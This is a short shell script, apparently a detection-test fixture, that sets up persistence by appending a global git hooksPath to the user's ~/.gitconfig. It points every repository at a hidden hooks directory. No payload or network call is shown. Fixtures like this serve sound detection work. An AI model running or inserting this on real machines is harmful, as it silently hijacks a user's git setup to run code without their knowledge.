#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
# Global git-hook persistence without running `git config`: a [core] hooksPath appended straight
# to the user's ~/.gitconfig, so a hook runs in every repository they create or clone.
mkdir -p "$HOME/.local/share/devhooks"
cat >> "$HOME/.gitconfig" <<'EOF'
[core]
	hooksPath = ~/.local/share/devhooks
EOF
